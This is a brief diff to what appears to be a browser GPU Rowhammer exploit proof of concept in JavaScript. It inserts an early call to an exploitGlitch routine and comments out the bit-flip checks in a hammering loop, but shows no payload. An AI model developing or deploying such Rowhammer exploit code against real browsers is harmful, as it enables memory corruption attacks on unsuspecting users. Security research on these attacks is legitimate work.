@@ -6,6 +6,8 @@ async function glitch() {
     // create gl context
     initGL();
     initFramebuffer();
+    await exploitGlitch();
+    return;
     
     allocatePages(PAGES_PER_MB * 32);
     const allocator = new Allocator(PAGES_PER_MB * 192);
@@ -104,8 +106,8 @@ function hammerTime(contMem) {
             // console.log(`+++ Hammering bank [${offset}] [${offset + 1}] done`);
 
             // check hammered textures for bit flip
-            checkForFlip(contMem[offset + 16].texture, offset+16);
-            checkForFlip(contMem[offset + 17].texture, offset+17);
+            // checkForFlip(contMem[offset + 16].texture, offset+16);
+            // checkForFlip(contMem[offset + 17].texture, offset+17);
         }
 
     }
